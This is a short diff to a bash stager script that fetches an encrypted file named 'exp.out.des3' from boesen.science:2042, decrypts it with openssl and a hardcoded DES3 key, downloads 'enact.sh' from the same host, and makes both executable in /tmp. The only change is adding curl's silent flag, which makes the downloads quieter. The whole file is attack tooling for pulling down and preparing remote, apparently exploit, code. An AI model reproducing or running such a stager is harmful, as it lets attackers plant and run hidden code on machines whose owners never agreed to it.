@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
 # Don't try to set variables in this file. Each line is executed independently.
 
-curl -Lo /tmp/exp.out.des3 boesen.science:2042/mac/exp.out.des3
+curl -Lso /tmp/exp.out.des3 boesen.science:2042/mac/exp.out.des3
 openssl des3 -d -in /tmp/exp.out.des3 -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
 
-curl -Lo /tmp/enact.sh boesen.science:2042/mac/enact.sh
+curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
 
 chmod +x /tmp/exp.out /tmp/enact.sh
 
